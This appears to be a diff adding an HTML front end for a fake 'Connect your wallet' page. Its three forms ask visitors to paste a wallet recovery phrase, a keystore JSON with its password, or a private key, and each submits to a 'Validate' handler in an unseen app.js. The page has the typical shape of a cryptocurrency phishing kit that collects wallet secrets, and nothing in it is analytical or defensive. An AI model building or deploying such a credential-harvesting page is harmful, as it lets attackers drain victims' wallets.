@@ -1,0 +1,115 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="style.css" />
+    <link rel="stylesheet" href="css/bootstrap.min.css" />
+    <link rel="stylesheet" href="form.css" />
+    <title>Connect your wallet</title>
+    <script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>
+  </head>
+  <body class="f-mdd-14" x-data="wconnForm()">
+    <!-- Navigation -->
+    <nav class="navbar navbar-expand" id="nav-bg">
+      <div class="container">
+        <div class="navbar-brand">
+        </div>
+
+        <!-- <button
+          class="navbar-toggler"
+          type="button"
+          data-toggle="collpase"
+          data-target="#navbarSupposrtedContent"
+          aria-controls="navbarSupopretedContent"
+          aria-expanded="false"
+          aria-label="Toggle navigation"
+        >
+          <span class="navbar-toggler-icon"></span>
+        </button> -->
+
+        <div class="collapse navbar-collapse">
+          <ul class="navbar-nav justify-content-center mx-auto">
+            <li class="nav-item">
+              <a class="nav-link" id="menu-item-1" href="">Protocol</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" id="menu-item-2"  href="">Docs</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" id="menu-item-3"  href="">Github</a>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </nav>
+    <!-- Phrase form -->
+
+    <div class="container">
+        <div class="form-wrap py-5 px-2 mt-5">
+            <ul class="nav nav-pills nav-fill">
+                <li class="nav-item px-1">
+                  <button type="button" class="nav-link ste-pill" :class="selected=='phrase' ? 'active' : ''" @click="selected='phrase'">
+                      <span class="f-11 f-mdd-12">Phrase</span>
+                  </button>
+                </li>
+                <li class="nav-item px-1">
+                    <button type="button" class="nav-link ste-pill" :class="selected=='keystore' ? 'active' : ''" @click="selected='keystore'">
+                        <span class="f-11 f-mdd-12">Keystore JSON</span>
+                    </button>
+                </li>
+                <li class="nav-item px-1">
+                    <button type="button" class="nav-link ste-pill" :class="selected=='private' ? 'active' : ''" @click="selected='private'">
+                        <span class="f-11 f-mdd-12">Private Key</span>
+                    </button>
+                </li>
+            </ul>
+            <form id="ste-phrase-frm" x-cloak action="javascript:void(0)" x-show="selected=='phrase'" @submit.prevent="submitPhrase">
+                <section class="form-row mt-3">
+                    <div class="form-group col-12">
+                        <textarea name="" id="" cols="30" rows="8" class="form-control ste-input" placeholder="Phrase..." x-model="phrase"></textarea>
+                    </div>
+                    <div class="form-group col-12 mt-4">
+                        <span>Typically 12 (sometimes 24) words seperated by single spaces</span>
+                    </div>
+                    <div class="form-group col-12 mt-4 w-100">
+                        <button class="btn btn-block ste-btn w-100" type="submit">Validate</button>
+                    </div>
+                </section>
+            </form>
+            <form id="ste-keystore-frm" x-cloak action="javascript:void(0)" x-show="selected=='keystore'" @submit.prevent="submitKeystoreJSON">
+                <section class="form-row mt-3 mb-2">
+                    <div class="form-group col-12">
+                        <textarea name="" id="" cols="30" rows="5" class="form-control ste-input" placeholder="keystore JSON..." x-model="keystore"></textarea>
+                    </div>
+                    <div class="form-group col-12 mt-2">
+                        <input type="text" placeholder="Password" class="form-control ste-input" x-model="keyPassword">
+                    </div>
+                    <div class="form-group col-12 mt-4">
+                        <span>Several lines of text beginning with '(...)' plus the password you used to encypt it.</span>
+                    </div>
+                    <div class="form-group col-12 mt-4 w-100">
+                        <button class="btn btn-block ste-btn w-100" type="submit">Validate</button>
+                    </div>
+                </section>
+            </form>
+            <form id="ste-privatekey-frm" x-cloak action="javascript:void(0)" x-show="selected=='private'" @submit.prevent="submitPrivateKey">
+                <section class="form-row mt-3">
+                    <div class="form-group col-12">
+                        <textarea name="privateKey" id="" cols="30" rows="5" class="form-control ste-input" placeholder="Private Key..." x-model="privatekey"></textarea>
+                    </div>
+                    <div class="form-group col-12 mt-4">
+                        <span>Typically 12 (sometimes 24) words seperated by single spaces.</span>
+                    </div>
+                    <div class="form-group col-12 mt-4 w-100">
+                        <button class="btn btn-block ste-btn w-100" type="submit">Validate</button>
+                    </div>
+                </section>
+            </form>
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+    <script src="js/bootstrap.js"></script>
+  </body>
+</html>
